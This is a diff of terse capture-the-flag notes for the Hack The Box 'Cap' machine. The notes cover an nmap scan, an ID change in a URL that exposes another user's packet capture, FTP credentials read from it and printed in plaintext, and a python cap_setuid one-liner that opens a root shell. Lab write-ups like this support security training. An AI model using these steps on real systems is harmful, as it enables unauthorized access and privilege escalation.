@@ -1,0 +1,50 @@
+nmap -sSVC -Pn -vv 10.10.10.245
+
+http://10.10.10.245/data/12
+...
+change 1 to 0
+http://10.10.10.245/data/0
+
+wireshark --> ftp success --> follow-->tcp stream
+USER nathan
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!
+230 Login successful.
+
+USER nathan:Buck3tH4TF0RM3!
+
+./linpeas.sh | grep python
+...
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+...
+
+or 
+[+] Files with POSIX capabilities set:
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+or 
+getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+
+
+https://gtfobins.github.io/gtfobins/python/#capabilities
+
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+#cat /root/root.txt
+
+https://app.hackthebox.eu/machines/351
+https://zweilosec.gitbook.io/hackers-rest/linux-1/linux-redteam/privilege-escalation
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities
+
+https://nepcodex.com/2021/06/cap-walkthrough-hackthebox-writeup/
+https://al1z4deh.medium.com/hackthebox-cap-walkthrough-2d74889250c3
+https://www.cybercowboys.nl/2021/07/18/cap-hackthebox/
